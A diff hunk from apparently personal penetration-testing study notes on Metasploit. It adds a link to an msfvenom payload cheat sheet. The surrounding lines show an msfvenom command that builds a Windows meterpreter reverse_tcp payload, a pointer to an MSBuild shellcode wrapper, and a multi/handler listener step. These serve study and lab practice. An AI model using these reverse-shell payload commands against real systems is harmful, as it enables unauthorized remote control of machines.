@@ -180,6 +180,7 @@ Practice searching for payload and exploits inside of metasploit: `search type:e
     - example csharp wrapper (shellcode needs to be replaced with custom one) https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
     - then start a msfconsole listener with an `exploit/multi/handler` on the same port/ip as the paylaod`
   -e.g., `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw -o output.raw --platform widows -a x86`
+- Good CheatSheet here https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
   
 
 ## METASM
